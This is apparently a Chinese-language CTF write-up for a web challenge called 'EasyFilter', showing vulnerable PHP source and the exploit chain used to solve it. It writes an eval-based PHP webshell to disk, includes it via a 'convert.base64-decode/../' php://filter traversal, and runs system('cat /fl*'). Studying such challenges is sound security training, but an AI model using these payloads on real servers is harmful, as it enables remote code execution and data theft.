# EasyFilter



```php
<?php
    ini_set("open_basedir","./");
    if(!isset($_GET['action'])){
        highlight_file(__FILE__);
        die();
    }
    if($_GET['action'] == 'w'){
        @mkdir("./files/");
        $content = $_GET['c'];
        $file = bin2hex(random_bytes(5));
        file_put_contents("./files/".$file,base64_encode($content));
        echo "./files/".$file;
    }elseif($_GET['action'] == 'r'){
        $r = $_GET['r'];
        $file = "./files/".$r;
        include("php://filter/resource=$file");
    }
    
```

在最后一行代码那里正常包含文件`?action=r&r=d0165506bd`，发现有这些warning：

![image-20211023195300238](D:\this_is_feng\github\CTF\Web\writeup\第四届强网”拟态防御国际精英挑战赛-Web.assets\image-20211023195300238.png)

发现这么一行很奇妙的warning：

```
Warning: include(): unable to locate filter "d0165506bd" in /var/www/html/index.php on line 16
```

传过去的不是文件名吗，怎么被当成过滤器了？？？

但是能成功包含出内容，所以这是又被当成过滤器又被当成文件了？那尝试路径穿越写马：

```
http://124.70.181.14:32766/?action=w&c=<?php eval($_POST[0]);?>



http://124.70.181.14:32766/?action=r&r=convert.base64-decode/../d0165506bd

0=system('cat /fl*');
```

成功getshell。